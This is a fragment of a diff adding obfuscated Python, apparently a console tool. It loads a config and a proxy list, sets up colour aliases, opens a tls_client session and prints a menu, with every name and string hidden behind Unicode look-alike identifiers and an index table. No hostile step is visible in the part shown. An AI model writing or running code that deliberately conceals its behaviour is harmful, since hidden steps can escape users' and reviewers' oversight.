+        𝙛.write(𝘐𝘕𝙄𝗡𝙡𝘭𝙄𝙈𝗜𝙄𝘭𝘔𝘭𝘭𝗜𝘭𝗹𝙉𝘕𝗜𝙡𝗹𝘔𝘕𝗹𝙉𝙡𝙈𝙄𝙈𝘐𝘔[26])
+with 𝘰𝙥𝘦𝙣(𝘐𝙉𝙄𝗡𝙡𝙡𝗜𝗠𝘐𝘐𝘭𝘔𝙡𝘭𝘐𝘭𝗹𝗡𝙉𝗜𝙡𝘭𝘔𝗡𝗹𝘕𝗹𝘔𝗜𝙈𝗜𝗠[25], encoding=𝗜𝗡𝙄𝙉𝘭𝗹𝙄𝘔𝙄𝙄𝘭𝘔𝘭𝘭𝗜𝗹𝙡𝗡𝗡𝘐𝙡𝘭𝙈𝘕𝘭𝗡𝗹𝘔𝘐𝗠𝙄𝙈[27]) as 𝘧:
+    𝗻𝘪𝙜 = 𝗷𝘴𝙤𝗻.load(𝙛)
+𝘱𝘳𝗼𝘅𝙮 = 𝙣𝘪𝙜.get(𝘐𝘕𝙄𝗡𝘭𝗹𝗜𝘔𝗜𝙄𝗹𝘔𝘭𝗹𝘐𝗹𝙡𝙉𝘕𝗜𝙡𝙡𝙈𝘕𝘭𝘕𝙡𝗠𝗜𝘔𝗜𝙈[28])
+𝘱𝘳𝙤𝘅𝗶𝙚𝙨 = 𝗼𝗽𝙚𝘯(𝘐𝙉𝘐𝘕𝗹𝗹𝘐𝘔𝘐𝘐𝘭𝗠𝙡𝗹𝘐𝘭𝗹𝙉𝗡𝗜𝘭𝗹𝙈𝗡𝙡𝘕𝗹𝗠𝙄𝗠𝘐𝙈[29], 𝘐𝙉𝙄𝙉𝘭𝘭𝗜𝙈𝙄𝗜𝙡𝗠𝙡𝗹𝗜𝘭𝙡𝗡𝙉𝘐𝘭𝗹𝙈𝙉𝙡𝘕𝙡𝘔𝘐𝘔𝗜𝘔[30], encoding=𝗜𝗡𝘐𝙉𝘭𝗹𝗜𝙈𝘐𝗜𝙡𝘔𝗹𝙡𝙄𝙡𝘭𝙉𝘕𝗜𝘭𝘭𝘔𝗡𝙡𝙉𝙡𝘔𝘐𝘔𝘐𝗠[27]).read().splitlines()
+𝘣 = 𝗙𝙤𝗿𝘦.LIGHTBLUE_EX
+𝗿 = 𝙁𝙤𝗿𝘦.RESET
+𝘨 = 𝙁𝘰𝗿𝘦.LIGHTBLACK_EX
+𝙖 = 𝙁𝗼𝘳𝗲.BLUE
+𝙘 = 𝗙𝗼𝘳𝙚.CYAN
+𝙡𝙘 = 𝘍𝘰𝗿𝗲.LIGHTCYAN_EX
+𝗿𝗲𝙙 = 𝙁𝘰𝙧𝙚.RED
+𝘺𝗲𝘭𝙡𝙤𝘸 = 𝙁𝙤𝙧𝗲.YELLOW
+𝙜𝗿𝗲𝘦𝘯 = 𝗙𝘰𝘳𝘦.GREEN
+𝗯𝙡𝙪𝘦 = 𝗙𝘰𝗿𝗲.BLUE
+𝙤𝙧𝙖𝘯𝗴𝗲 = 𝙁𝘰𝗿𝗲.RED + 𝘍𝘰𝙧𝙚.YELLOW
+𝗽𝙧𝘦𝘵𝘵𝘆 = 𝙁𝘰𝙧𝗲.LIGHTMAGENTA_EX + 𝘍𝗼𝘳𝙚.LIGHTCYAN_EX
+𝗺𝗮𝙜𝙚𝙣𝘵𝘢 = 𝙁𝗼𝗿𝗲.MAGENTA
+𝘭𝙞𝙜𝙝𝘁𝙗𝗹𝙪𝙚 = 𝘍𝙤𝘳𝗲.LIGHTBLUE_EX
+𝘤𝙮𝗮𝗻 = 𝗙𝘰𝙧𝗲.CYAN
+𝗴𝙧𝘢𝘺 = 𝗙𝗼𝗿𝘦.LIGHTBLACK_EX + 𝙁𝗼𝙧𝙚.WHITE
+𝘳𝙚𝙨𝗲𝙩 = 𝗙𝘰𝘳𝘦.RESET
+𝙥𝙞𝗻𝙠 = 𝗙𝗼𝙧𝗲.LIGHTGREEN_EX + 𝘍𝗼𝘳𝗲.LIGHTMAGENTA_EX
+𝘀𝙚𝘀𝙨𝗶𝘰𝘯 = 𝘁𝗹𝘀_𝙘𝗹𝙞𝘦𝘯𝘵.Session(𝙄𝗡𝗜𝗡𝙡𝘭𝗜𝘔𝙄𝘐𝗹𝘔𝘭𝙡𝗜𝗹𝙡𝙉𝙉𝗜𝗹𝘭𝗠𝘕𝘭𝗡𝗹𝘔𝙄𝗠𝗜𝗠[31])
+𝗺𝙚𝗻𝙪 = f'{𝘳}{𝗜𝙉𝗜𝙉𝗹𝘭𝘐𝗠𝗜𝘐𝙡𝗠𝗹𝗹𝙄𝙡𝗹𝘕𝘕𝘐𝗹𝗹𝘔𝘕𝘭𝘕𝗹𝙈𝙄𝘔𝗜𝙈[32]}{𝙡𝘤}{𝗜𝗡𝙄𝘕𝘭𝗹𝙄𝙈𝙄𝗜𝘭𝙈𝗹𝗹𝙄𝗹𝗹𝙉𝙉𝗜𝗹𝘭𝗠𝗡𝘭𝗡𝙡𝘔𝘐𝘔𝙄𝗠[33]}{𝘳}{𝘐𝘕𝙄𝙉𝘭𝗹𝗜𝘔𝘐𝘐𝗹𝗠𝘭𝗹𝘐𝗹𝘭𝙉𝗡𝙄𝙡𝘭𝗠𝙉𝘭𝘕𝗹𝙈𝙄𝗠𝘐𝗠[34]}{𝘭𝗰}{𝗜𝙉𝗜𝘕𝙡𝗹𝙄𝙈𝙄𝗜𝘭𝙈𝙡𝙡𝘐𝗹𝘭𝗡𝗡𝗜𝗹𝗹𝙈𝙉𝘭𝗡𝗹𝗠𝗜𝙈𝘐𝙈[35]}{𝘳}{𝗜𝙉𝘐𝗡𝘭𝙡𝘐𝘔𝙄𝗜𝘭𝗠𝙡𝗹𝘐𝙡𝘭𝗡𝙉𝘐𝘭𝙡𝗠𝙉𝘭𝗡𝙡𝙈𝘐𝗠𝗜𝙈[36]}{𝘭𝘤}{𝘐𝗡𝗜𝘕𝘭𝘭𝗜𝗠𝘐𝘐𝘭𝘔𝘭𝙡𝘐𝙡𝙡𝗡𝗡𝙄𝗹𝙡𝙈𝗡𝙡𝗡𝘭𝗠𝗜𝘔𝙄𝗠[35]}{𝙧}{𝘐𝙉𝗜𝘕𝗹𝗹𝘐𝘔𝘐𝙄𝗹𝘔𝙡𝘭𝗜𝗹𝘭𝙉𝙉𝗜𝗹𝘭𝗠𝘕𝘭𝙉𝙡𝘔𝘐𝗠𝙄𝘔[34]}{𝘭𝗰}{𝘐𝙉𝘐𝗡𝗹𝗹𝘐𝙈𝗜𝘐𝘭𝙈𝘭𝘭𝗜𝙡𝙡𝘕𝗡𝘐𝘭𝙡𝗠𝗡𝗹𝙉𝗹𝗠𝗜𝗠𝙄𝙈[37]}{𝙧}{𝙄𝗡𝙄𝘕𝙡𝘭𝗜𝘔𝙄𝗜𝙡𝙈𝗹𝘭𝙄𝗹𝗹𝘕𝗡𝗜𝘭𝘭𝘔𝘕𝙡𝘕𝘭𝗠𝗜𝙈𝘐𝙈[34]}{𝘭𝘤}{𝙄𝘕𝘐𝘕𝘭𝙡𝘐𝗠𝗜𝗜𝘭𝘔𝙡𝙡𝘐𝙡𝙡𝘕𝗡𝘐𝘭𝙡𝙈𝗡𝗹𝘕𝗹𝙈𝗜𝗠𝙄𝘔[35]}{𝙧}{𝗜𝗡𝗜𝙉𝘭𝙡𝘐𝙈𝙄𝗜𝙡𝘔𝗹𝘭𝗜𝙡𝗹𝗡𝘕𝘐𝗹𝗹𝙈𝗡𝘭𝗡𝗹𝘔𝙄𝗠𝙄𝙈[34]}{𝘭𝘤}{𝗜𝙉𝙄𝙉𝗹𝗹𝘐𝙈𝙄𝘐𝙡𝗠𝗹𝗹𝗜𝗹𝘭𝗡𝘕𝗜𝘭𝙡𝙈𝗡𝙡𝙉𝗹𝙈𝗜𝗠𝙄𝘔[38]}{𝘳}{𝘐𝙉𝗜𝗡𝗹𝗹𝙄𝗠𝘐𝗜𝘭𝗠𝘭𝗹𝗜𝗹𝗹𝘕𝙉𝙄𝙡𝙡𝙈𝘕𝘭𝗡𝗹𝗠𝗜𝘔𝙄𝘔[34]}{𝘭𝙘}{𝗜𝗡𝘐𝘕𝗹𝙡𝘐𝘔𝘐𝘐𝗹𝗠𝙡𝗹𝘐𝙡𝘭𝙉𝘕𝗜𝘭𝘭𝗠𝗡𝗹𝙉𝙡𝗠𝗜𝗠𝘐𝘔[35]}{𝘳}{𝙄𝗡𝘐𝗡𝗹𝗹𝗜𝘔𝘐𝙄𝘭𝙈𝘭𝗹𝙄𝘭𝘭𝘕𝙉𝗜𝗹𝘭𝗠𝙉𝙡𝗡𝙡𝗠𝗜𝘔𝗜𝗠[39]}{𝗹𝙘}{𝗜𝗡𝗜𝙉𝘭𝘭𝙄𝗠𝙄𝗜𝗹𝙈𝘭𝙡𝘐𝘭𝙡𝗡𝘕𝗜𝙡𝙡𝘔𝘕𝙡𝗡𝘭𝙈𝘐𝙈𝗜𝘔[38]}{𝗿}{𝗜𝙉𝘐𝙉𝙡𝘭𝗜𝘔𝘐𝘐𝗹𝗠𝗹𝗹𝙄𝘭𝗹𝙉𝗡𝗜𝙡𝗹𝘔𝘕𝗹𝙉𝗹𝗠𝗜𝙈𝙄𝙈[39]}{𝘭𝗰}{𝗜𝙉𝙄𝘕𝙡𝘭𝘐𝙈𝙄𝙄𝗹𝙈𝗹𝘭𝗜𝘭𝙡𝙉𝗡𝙄𝗹𝗹𝘔𝘕𝙡𝙉𝗹𝗠𝘐𝙈𝗜𝘔[40]}{𝙧}{𝙄𝗡𝙄𝗡𝙡𝘭𝙄𝘔𝙄𝗜𝙡𝘔𝙡𝗹𝙄𝗹𝙡𝙉𝘕𝘐𝗹𝗹𝘔𝘕𝙡𝗡𝗹𝗠𝘐𝗠𝘐𝗠[34]}{𝗹𝘤}{𝙄𝙉𝙄𝘕𝙡𝗹𝙄𝙈𝙄𝙄𝘭𝗠𝘭𝘭𝘐𝘭𝙡𝘕𝗡𝙄𝙡𝙡𝘔𝙉𝘭𝘕𝘭𝗠𝘐𝙈𝙄𝘔[41]}{𝘳}{𝗜𝙉𝗜𝘕𝗹𝘭𝘐𝙈𝗜𝘐𝗹𝙈𝙡𝗹𝙄𝙡𝗹𝗡𝗡𝗜𝗹𝘭𝘔𝗡𝙡𝗡𝙡𝗠𝗜𝗠𝗜𝘔[34]}{𝘭𝘤}{𝙄𝙉𝘐𝗡𝙡𝗹𝗜𝘔𝗜𝘐𝙡𝗠𝗹𝙡𝗜𝘭𝘭𝗡𝗡𝗜𝙡𝗹𝗠𝗡𝘭𝘕𝙡𝗠𝙄𝗠𝗜𝘔[42]}{𝘳}{𝘐𝗡𝙄𝘕𝘭𝘭𝗜𝗠𝘐𝘐𝘭𝘔𝘭𝗹𝗜𝘭𝙡𝘕𝙉𝘐𝙡𝙡𝘔𝙉𝘭𝘕𝙡𝘔𝘐𝗠𝗜𝗠[34]}{𝙡𝙘}{𝙄𝙉𝘐𝗡𝘭𝙡𝗜𝙈𝘐𝗜𝙡𝘔𝘭𝙡𝙄𝘭𝗹𝙉𝙉𝘐𝘭𝘭𝙈𝙉𝗹𝗡𝙡𝘔𝘐𝘔𝘐𝗠[43]}{𝗿}{𝘐𝗡𝗜𝗡𝗹𝗹𝗜𝗠𝗜𝗜𝘭𝙈𝙡𝗹𝘐𝘭𝗹𝙉𝙉𝘐𝘭𝙡𝗠𝗡𝗹𝙉𝙡𝘔𝙄𝙈𝙄𝘔[34]}{𝙡𝘤}{𝙄𝙉𝗜𝘕𝗹𝙡𝙄𝘔𝗜𝗜𝙡𝗠𝙡𝘭𝗜𝗹𝗹𝘕𝙉𝙄𝘭𝘭𝙈𝘕𝗹𝗡𝙡𝙈𝘐𝘔𝘐𝘔[44]}{𝗿}{𝙄𝙉𝗜𝗡𝘭𝙡𝗜𝘔𝘐𝗜𝘭𝙈𝘭𝗹𝗜𝙡𝗹𝗡𝗡𝘐𝗹𝗹𝘔𝘕𝗹𝙉𝘭𝘔𝘐𝗠𝙄𝗠[34]}{𝗹𝙘}{𝙄𝘕𝗜𝗡𝗹𝘭𝘐𝙈𝗜𝘐𝗹𝘔𝙡𝘭𝘐𝙡𝗹𝘕𝙉𝗜𝗹𝘭𝙈𝘕𝙡𝗡𝘭𝗠𝙄𝘔𝗜𝗠[42]}{𝗿}{𝘐𝙉𝘐𝘕𝘭𝗹𝘐𝗠𝗜𝗜𝘭𝙈𝘭𝘭𝗜𝗹𝗹𝗡𝘕𝗜𝘭𝘭𝙈𝘕𝗹𝙉𝙡𝗠𝙄𝗠𝙄𝙈[34]}{𝘭𝙘}{𝗜𝗡𝗜𝘕𝗹𝙡𝙄𝘔𝗜𝘐𝘭𝗠𝘭𝘭𝗜𝗹𝘭𝗡𝗡𝙄𝗹𝗹𝗠𝘕𝗹𝗡𝘭𝗠𝗜𝘔𝗜𝗠[45]}{𝙧}{𝗜𝗡𝙄𝗡𝙡𝙡𝗜𝙈𝗜𝙄𝗹𝙈𝘭𝙡𝘐𝘭𝗹𝗡𝗡𝙄𝘭𝗹𝙈𝗡𝙡𝙉𝗹𝘔𝙄𝗠𝘐𝙈[34]}{𝗹𝙘}{𝗜𝘕𝙄𝗡𝘭𝗹𝙄𝘔𝗜𝘐𝘭𝗠𝗹𝗹𝗜𝙡𝙡𝗡𝗡𝘐𝙡𝗹𝗠𝗡𝙡𝙉𝘭𝙈𝗜𝙈𝗜𝘔[42]}{𝙧}{𝘐𝗡𝗜𝘕𝙡𝘭𝙄𝗠𝗜𝘐𝙡𝙈𝗹𝗹𝘐𝙡𝗹𝘕𝘕𝗜𝙡𝙡𝗠𝘕𝗹𝙉𝘭𝙈𝘐𝘔𝘐𝙈[46]}{𝙡𝘤}{𝙄𝘕𝙄𝘕𝗹𝙡𝙄𝗠𝗜𝘐𝗹𝗠𝗹𝘭𝗜𝗹𝙡𝗡𝙉𝙄𝗹𝗹𝘔𝘕𝗹𝗡𝘭𝗠𝗜𝘔𝗜𝗠[47]}{𝗿}{𝙄𝙉𝘐𝗡𝙡𝗹𝘐𝗠𝗜𝙄𝘭𝙈𝙡𝙡𝘐𝘭𝙡𝗡𝗡𝙄𝙡𝘭𝙈𝘕𝘭𝘕𝙡𝗠𝗜𝙈𝘐𝘔[46]}{𝗹𝙘}{𝗜𝗡𝙄𝗡𝗹𝗹𝘐𝘔𝘐𝗜𝙡𝗠𝗹𝙡𝙄𝙡𝙡𝗡𝗡𝘐𝘭𝙡𝘔𝙉𝗹𝙉𝗹𝙈𝘐𝗠𝘐𝘔[42]}{𝙧}{𝙄𝗡𝗜𝘕𝗹𝙡𝙄𝘔𝘐𝙄𝘭𝗠𝙡𝘭𝙄𝘭𝙡𝙉𝙉𝙄𝙡𝗹𝘔𝙉𝗹𝗡𝗹𝘔𝘐𝙈𝙄𝘔[48]}{𝗹𝙘}{𝙄𝘕𝙄𝘕𝘭𝙡𝘐𝗠𝘐𝗜𝗹𝘔𝙡𝗹𝘐𝙡𝘭𝘕𝗡𝙄𝘭𝗹𝘔𝘕𝘭𝙉𝙡𝘔𝘐𝗠𝙄𝗠[42]}{𝗿}{𝙄𝙉𝙄𝗡𝙡𝗹𝘐𝗠𝘐𝙄𝘭𝘔𝗹𝘭𝙄𝘭𝗹𝘕𝙉𝙄𝙡𝙡𝘔𝗡𝘭𝘕𝗹𝙈𝘐𝘔𝘐𝗠[49]}{𝙡𝗰}{𝙄𝙉𝙄𝙉𝗹𝙡𝙄𝘔𝙄𝘐𝗹𝘔𝘭𝗹𝘐𝙡𝙡𝗡𝙉𝘐𝙡𝗹𝗠𝙉𝗹𝙉𝗹𝘔𝗜𝘔𝙄𝘔[33]}{𝘳}{𝙄𝙉𝘐𝘕𝙡𝙡𝘐𝘔𝘐𝙄𝙡𝙈𝗹𝘭𝗜𝗹𝘭𝙉𝗡𝗜𝗹𝘭𝗠𝘕𝘭𝙉𝗹𝗠𝘐𝗠𝗜𝙈[34]}{𝗹𝙘}{𝗜𝙉𝙄𝗡𝘭𝙡𝗜𝙈𝘐𝗜𝘭𝗠𝗹𝘭𝗜𝗹𝘭𝙉𝘕𝗜𝘭𝗹𝙈𝗡𝙡𝘕𝙡𝙈𝘐𝙈𝗜𝗠[44]}{𝙧}{𝘐𝙉𝙄𝗡𝗹𝗹𝙄𝗠𝘐𝗜𝗹𝙈𝙡𝙡𝙄𝙡𝙡𝘕𝘕𝙄𝗹𝙡𝙈𝘕𝗹𝗡𝙡𝘔𝗜𝙈𝙄𝙈[34]}{𝘭𝗰}{𝗜𝙉𝙄𝗡𝙡𝙡𝗜𝘔𝗜𝙄𝘭𝗠𝙡𝘭𝙄𝗹𝘭𝗡𝘕𝗜𝗹𝗹𝘔𝗡𝙡𝘕𝙡𝗠𝙄𝘔𝘐𝘔[42]}{𝗿}{𝙄𝗡𝗜𝘕𝘭𝙡𝘐𝗠𝙄𝘐𝘭𝙈𝘭𝘭𝗜𝘭𝘭𝗡𝗡𝙄𝙡𝗹𝙈𝙉𝘭𝘕𝙡𝘔𝙄𝙈𝙄𝘔[34]}{𝘭𝘤}{𝗜𝗡𝙄𝘕𝗹𝙡𝘐𝗠𝙄𝙄𝗹𝘔𝙡𝗹𝘐𝙡𝙡𝗡𝙉𝙄𝙡𝙡𝘔𝗡𝘭𝙉𝙡𝗠𝘐𝗠𝗜𝘔[45]}{𝘳}{𝗜𝘕𝘐𝙉𝗹𝗹𝘐𝘔𝗜𝘐𝘭𝗠𝘭𝘭𝗜𝘭𝗹𝙉𝗡𝙄𝘭𝘭𝘔𝘕𝘭𝘕𝗹𝗠𝗜𝙈𝘐𝘔[34]}{𝘭𝗰}{𝘐𝙉𝘐𝗡𝘭𝘭𝗜𝘔𝙄𝗜𝙡𝗠𝗹𝘭𝘐𝘭𝗹𝙉𝘕𝗜𝘭𝘭𝙈𝗡𝘭𝙉𝙡𝘔𝘐𝗠𝘐𝘔[42]}{𝘳}{𝙄𝙉𝘐𝙉𝙡𝘭𝘐𝘔𝙄𝗜𝘭𝘔𝘭𝙡𝗜𝗹𝘭𝙉𝘕𝗜𝘭𝙡𝘔𝙉𝙡𝗡𝗹𝙈𝘐𝗠𝗜𝘔[34]}{𝗹𝘤}{𝗜𝘕𝙄𝗡𝘭𝙡𝙄𝙈𝗜𝘐𝙡𝙈𝗹𝗹𝗜𝙡𝙡𝙉𝙉𝙄𝙡𝗹𝗠𝙉𝗹𝗡𝘭𝙈𝗜𝘔𝙄𝙈[50]}{𝗿}{𝘐𝘕𝙄𝘕𝙡𝘭𝗜𝗠𝙄𝘐𝘭𝙈𝙡𝘭𝗜𝙡𝙡𝗡𝘕𝗜𝗹𝗹𝙈𝗡𝙡𝙉𝙡𝗠𝘐𝘔𝗜𝙈[46]}{𝘭𝘤}{𝘐𝘕𝗜𝘕𝙡𝗹𝘐𝘔𝙄𝙄𝘭𝗠𝙡𝘭𝘐𝘭𝘭𝗡𝗡𝗜𝗹𝗹𝙈𝘕𝙡𝗡𝘭𝗠𝘐𝘔𝘐𝘔[50]}{𝘳}{𝘐𝘕𝗜𝙉𝙡𝙡𝘐𝙈𝙄𝙄𝘭𝗠𝘭𝗹𝗜𝙡𝘭𝗡𝙉𝙄𝙡𝘭𝙈𝗡𝘭𝘕𝗹𝘔𝘐𝙈𝙄𝘔[34]}{𝙡𝙘}{𝙄𝗡𝘐𝗡𝙡𝙡𝙄𝙈𝗜𝘐𝘭𝙈𝘭𝗹𝗜𝙡𝗹𝗡𝘕𝙄𝗹𝗹𝗠𝗡𝗹𝙉𝘭𝘔𝘐𝗠𝙄𝙈[42]}{𝘳}{𝗜𝘕𝘐𝙉𝗹𝗹𝘐𝘔𝙄𝘐𝙡𝙈𝗹𝘭𝘐𝗹𝘭𝙉𝗡𝘐𝗹𝙡𝘔𝗡𝘭𝘕𝗹𝘔𝘐𝘔𝗜𝘔[51]}{𝙡𝙘}{𝘐𝘕𝗜𝙉𝗹𝘭𝗜𝙈𝗜𝘐𝘭𝗠𝗹𝘭𝗜𝗹𝘭𝙉𝘕𝗜𝗹𝙡𝘔𝗡𝗹𝘕𝗹𝘔𝗜𝙈𝘐𝙈[52]}{𝘳}{𝗜𝘕𝙄𝗡𝙡𝗹𝙄𝗠𝗜𝙄𝗹𝗠𝗹𝘭𝙄𝙡𝙡𝗡𝗡𝙄𝙡𝘭𝗠𝙉𝙡𝙉𝗹𝗠𝙄𝙈𝗜𝘔[34]}{𝘭𝘤}{𝘐𝘕𝗜𝙉𝘭𝙡𝙄𝗠𝗜𝙄𝙡𝙈𝙡𝙡𝘐𝙡𝙡𝘕𝙉𝙄𝙡𝙡𝗠𝘕𝗹𝙉𝘭𝘔𝗜𝘔𝗜𝘔[42]}{𝙧}{𝗜𝙉𝗜𝗡𝙡𝘭𝙄𝘔𝗜𝘐𝙡𝗠𝗹𝘭𝘐𝙡𝙡𝗡𝙉𝘐𝘭𝙡𝘔𝘕𝘭𝘕𝘭𝗠𝗜𝘔𝗜𝗠[34]}{𝘭𝙘}{𝗜𝗡𝘐𝙉𝘭𝗹𝗜𝙈𝘐𝘐𝗹𝘔𝙡𝗹𝗜𝘭𝘭𝗡𝗡𝙄𝙡𝘭𝘔𝗡𝙡𝗡𝘭𝗠𝗜𝙈𝗜𝙈[53]}{𝙧}{𝙄𝘕𝙄𝙉𝙡𝘭𝗜𝗠𝘐𝗜𝙡𝘔𝗹𝘭𝘐𝗹𝙡𝗡𝗡𝘐𝗹𝘭𝗠𝙉𝗹𝗡𝗹𝙈𝘐𝙈𝗜𝙈[34]}{𝙡𝘤}{𝘐𝘕𝗜𝙉𝗹𝘭𝙄𝘔𝘐𝙄𝙡𝙈𝙡𝘭𝘐𝗹𝘭𝘕𝙉𝗜𝙡𝙡𝘔𝗡𝙡𝗡𝙡𝗠𝗜𝗠𝙄𝗠[44]}{𝗿}{𝗜𝗡𝗜𝙉𝘭𝗹𝙄𝘔𝙄𝗜𝘭𝘔𝘭𝙡𝘐𝙡𝗹𝘕𝙉𝙄𝙡𝗹𝘔𝙉𝗹𝗡𝘭𝘔𝙄𝗠𝘐𝘔[34]}{𝘭𝙘}{𝙄𝘕𝙄𝗡𝘭𝘭𝗜𝘔𝘐𝘐𝗹𝗠𝘭𝗹𝗜𝘭𝙡𝙉𝗡𝗜𝗹𝘭𝘔𝘕𝙡𝙉𝘭𝙈𝗜𝗠𝗜𝘔[42]}{𝘳}{𝙄𝙉𝙄𝙉𝙡𝗹𝘐𝗠𝙄𝗜𝙡𝙈𝘭𝘭𝗜𝗹𝘭𝙉𝙉𝙄𝗹𝗹𝙈𝘕𝙡𝗡𝙡𝘔𝙄𝙈𝗜𝙈[34]}{𝘭𝘤}{𝙄𝗡𝙄𝙉𝙡𝘭𝙄𝗠𝗜𝗜𝗹𝙈𝗹𝘭𝗜𝙡𝘭𝗡𝗡𝙄𝗹𝙡𝘔𝘕𝙡𝘕𝘭𝙈𝙄𝙈𝙄𝙈[45]}{𝗿}{𝘐𝙉𝙄𝘕𝙡𝗹𝘐𝙈𝘐𝗜𝗹𝙈𝗹𝙡𝗜𝘭𝘭𝘕𝘕𝙄𝘭𝘭𝗠𝘕𝗹𝙉𝙡𝙈𝘐𝗠𝗜𝙈[34]}{𝗹𝘤}{𝗜𝗡𝘐𝘕𝗹𝘭𝙄𝘔𝙄𝙄𝘭𝘔𝙡𝗹𝘐𝗹𝗹𝙉𝘕𝗜𝗹𝙡𝗠𝘕𝘭𝙉𝗹𝗠𝙄𝘔𝘐𝘔[42]}{𝙧}{𝘐𝘕𝙄𝘕𝙡𝗹𝗜𝙈𝙄𝘐𝗹𝘔𝙡𝘭𝙄𝘭𝘭𝘕𝗡𝙄𝙡𝙡𝙈𝗡𝙡𝙉𝗹𝗠𝙄𝘔𝙄𝘔[34]}{𝙡𝗰}{𝘐𝗡𝗜𝘕𝗹𝘭𝙄𝘔𝗜𝙄𝙡𝘔𝗹𝙡𝗜𝙡𝙡𝗡𝗡𝗜𝙡𝙡𝙈𝙉𝗹𝙉𝘭𝙈𝘐𝙈𝙄𝙈[54]}{𝙧}{𝙄𝗡𝗜𝘕𝘭𝘭𝙄𝗠𝙄𝘐𝘭𝙈𝘭𝘭𝙄𝗹𝙡𝙉𝗡𝗜𝘭𝙡𝗠𝙉𝗹𝙉𝗹𝘔𝗜𝗠𝙄𝗠[34]}{𝙡𝙘}{𝗜𝙉𝗜𝗡𝘭𝗹𝙄𝘔𝗜𝙄𝗹𝘔𝗹𝗹𝘐𝙡𝗹𝗡𝙉𝗜𝗹𝙡𝗠𝙉𝗹𝗡𝗹𝗠𝙄𝘔𝙄𝙈[55]}{𝗿}{𝙄𝙉𝙄𝗡𝙡𝗹𝙄𝘔𝘐𝙄𝙡𝗠𝘭𝗹𝗜𝙡𝗹𝗡𝙉𝙄𝗹𝘭𝘔𝙉𝗹𝘕𝗹𝙈𝙄𝘔𝗜𝗠[34]}{𝗹𝗰}{𝘐𝘕𝗜𝗡𝙡𝘭𝙄𝗠𝘐𝙄𝘭𝗠𝙡𝗹𝙄𝗹𝗹𝗡𝙉𝘐𝗹𝗹𝗠𝗡𝗹𝘕𝘭𝙈𝙄𝗠𝗜𝙈[42]}{𝗿}{𝗜𝘕𝘐𝗡𝗹𝘭𝘐𝙈𝗜𝗜𝗹𝙈𝗹𝘭𝙄𝗹𝘭𝗡𝘕𝗜𝗹𝙡𝘔𝙉𝙡𝘕𝙡𝙈𝘐𝘔𝗜𝘔[51]}{𝗹𝗰}{𝗜𝘕𝙄𝘕𝗹𝘭𝙄𝘔𝘐𝙄𝗹𝙈𝗹𝗹𝘐𝙡𝙡𝘕𝗡𝘐𝗹𝗹𝗠𝗡𝗹𝘕𝙡𝗠𝙄𝗠𝙄𝗠[41]}{𝗿}{𝗜𝘕𝙄𝙉𝙡𝗹𝗜𝗠𝘐𝙄𝗹𝗠𝗹𝗹𝘐𝗹𝘭𝙉𝙉𝙄𝘭𝘭𝘔𝗡𝘭𝗡𝗹𝗠𝘐𝘔𝙄𝘔[34]}{𝗹𝘤}{𝘐𝙉𝘐𝗡𝘭𝙡𝘐𝗠𝘐𝗜𝘭𝙈𝗹𝙡𝗜𝗹𝘭𝗡𝙉𝙄𝗹𝘭𝙈𝙉𝙡𝘕𝘭𝘔𝘐𝗠𝘐𝙈[42]}{𝙧}{𝙄𝘕𝙄𝙉𝗹𝘭𝘐𝘔𝗜𝙄𝗹𝗠𝗹𝗹𝘐𝗹𝗹𝘕𝘕𝙄𝗹𝘭𝘔𝙉𝗹𝗡𝗹𝘔𝗜𝙈𝙄𝙈[36]}{𝗹𝗰}{𝗜𝗡𝙄𝙉𝙡𝘭𝗜𝗠𝘐𝙄𝘭𝗠𝘭𝙡𝙄𝙡𝘭𝘕𝙉𝗜𝘭𝗹𝘔𝗡𝗹𝗡𝘭𝗠𝗜𝙈𝙄𝗠[35]}{𝗿}{𝘐𝗡𝗜𝗡𝙡𝙡𝙄𝙈𝗜𝙄𝗹𝗠𝗹𝘭𝘐𝘭𝗹𝗡𝙉𝙄𝘭𝙡𝘔𝗡𝘭𝙉𝗹𝙈𝗜𝘔𝙄𝗠[36]}{𝗹𝗰}{𝘐𝘕𝗜𝘕𝙡𝘭𝘐𝗠𝙄𝙄𝗹𝙈𝘭𝙡𝘐𝙡𝙡𝘕𝙉𝗜𝘭𝙡𝘔𝗡𝙡𝘕𝗹𝘔𝙄𝙈𝘐𝗠[35]}{𝗿}{𝙄𝙉𝙄𝘕𝙡𝗹𝙄𝘔𝗜𝗜𝘭𝘔𝗹𝙡𝗜𝘭𝘭𝗡𝗡𝘐𝘭𝙡𝘔𝘕𝘭𝗡𝙡𝘔𝙄𝗠𝙄𝘔[34]}{𝙡𝗰}{𝙄𝘕𝗜𝗡𝙡𝘭𝗜𝗠𝙄𝙄𝗹𝗠𝗹𝘭𝗜𝗹𝘭𝙉𝗡𝙄𝗹𝘭𝙈𝗡𝘭𝗡𝙡𝙈𝗜𝙈𝘐𝙈[54]}{𝗿}{𝙄𝗡𝗜𝗡𝘭𝗹𝘐𝗠𝘐𝙄𝙡𝙈𝘭𝙡𝘐𝗹𝙡𝘕𝗡𝙄𝙡𝗹𝗠𝗡𝙡𝙉𝗹𝘔𝗜𝙈𝗜𝙈[56]}{𝙡𝙘}{𝗜𝗡𝗜𝙉𝙡𝗹𝙄𝙈𝙄𝘐𝙡𝗠𝙡𝘭𝙄𝗹𝘭𝙉𝘕𝗜𝘭𝗹𝗠𝗡𝗹𝘕𝙡𝘔𝘐𝙈𝘐𝙈[55]}{𝘳}{𝗜𝘕𝗜𝘕𝙡𝗹𝗜𝙈𝗜𝗜𝗹𝗠𝗹𝘭𝗜𝙡𝙡𝙉𝘕𝗜𝘭𝙡𝘔𝘕𝘭𝘕𝙡𝗠𝘐𝗠𝘐𝘔[34]}{𝙡𝘤}{𝘐𝗡𝙄𝘕𝗹𝙡𝙄𝙈𝗜𝘐𝗹𝗠𝗹𝗹𝘐𝘭𝗹𝘕𝗡𝘐𝙡𝗹𝙈𝘕𝘭𝘕𝗹𝙈𝘐𝘔𝙄𝗠[57]}{𝘳}{𝘐𝗡𝙄𝙉𝘭𝘭𝘐𝘔𝘐𝙄𝘭𝘔𝗹𝗹𝘐𝘭𝙡𝘕𝗡𝗜𝙡𝗹𝘔𝙉𝘭𝘕𝗹𝗠𝙄𝙈𝘐𝙈[34]}{𝙡𝙘}{𝙄𝘕𝙄𝙉𝙡𝙡𝗜𝗠𝙄𝗜𝗹𝙈𝙡𝙡𝙄𝘭𝗹𝗡𝘕𝗜𝙡𝙡𝙈𝘕𝙡𝙉𝙡𝘔𝘐𝘔𝙄𝘔[58]}'
